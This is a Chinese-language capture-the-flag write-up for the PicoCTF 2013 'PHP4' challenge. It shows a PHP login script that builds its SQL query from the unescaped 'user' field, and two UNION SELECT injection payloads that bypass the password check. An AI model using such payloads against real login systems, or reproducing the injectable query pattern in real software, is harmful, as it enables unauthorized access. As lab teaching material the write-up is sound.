## PicoCTF 2013:PHP4

**分类：**脚本开发

## write-up

根据提示，我们可以访问`code.txt`该文件

```php
 <?php
        if($_POST['user'] && $_POST['pass']) {
            mysql_connect("localhost", “XXXXXXX”, “XXXXXXXX”) or die("Could not connect:" . mysql_error());
			mysql_select_db("ctfhub");
            $user = $_POST['user'];
            $pass = md5($_POST['pass']);
			$sql="select pw from ctfhub where user='$user'";
			$result = mysql_query($sql);
            $query = @mysql_fetch_array($result);

            if(($query['pw']) && (!strcasecmp($pass, $query['pw']))) {
                echo "<p>Logged in! Key: XXXXXXXXXXXXXXXXXX</p>";
            }
            else {
                echo("<p>Log in failure!</p>");
            }
        }
    ?>
```

这道题目最重要的条件判断语句为：`($query['pw']) && (!strcasecmp($pass, $query['pw']))`。查看代码，我们发现存在注入，我们可以构造如下语句完成挑战。

`payload1:user=' union select 'c18732f48a96c40d40a06e74b1305706'#&pass=ctfhub`

`payload2:user=' union select md5('ctfhub')#&pass=ctfhub`

